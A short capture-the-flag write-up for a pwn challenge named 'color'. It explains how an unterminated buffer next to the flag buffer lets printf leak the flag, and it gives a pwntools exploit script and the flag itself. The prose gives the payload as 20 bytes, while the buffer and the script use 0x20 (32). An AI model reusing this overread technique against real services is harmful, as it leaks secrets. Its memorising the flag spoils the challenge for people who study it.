https://ctftime.org/event/2449

# color (pwn)

What's your favorite color?

nc challs.pwnoh.io 13370

## Analysis

We can see that these two buffers are adjacent such that if `FAVORITE_COLOR` contained `b"A" * 20` string based operations which assume the presense of a null terminator would treat both buffers as a single string:

```C
char FAVORITE_COLOR[0x20];
char FLAG[0x28];
```

## Solution

1) Set `FAVORITE_COLOR` to `b"A" * 20`
2) Allow `printf("%s!?!? Mid af color\n", FAVORITE_COLOR);` to print the flag

```python
#!/usr/bin/env python3

from pwn import *
import re

#context.log_level = "debug"
p = remote("challs.pwnoh.io", 13370)

p.sendline(b"A" * 0x20)

# bctf{1_d0n7_c4r3_571ll_4_m1d_c010r}
print(re.search(r"bctf{.+}", p.readline().decode())[0])
```

## Flag
`bctf{1_d0n7_c4r3_571ll_4_m1d_c010r}`

smiley 2024/09/29
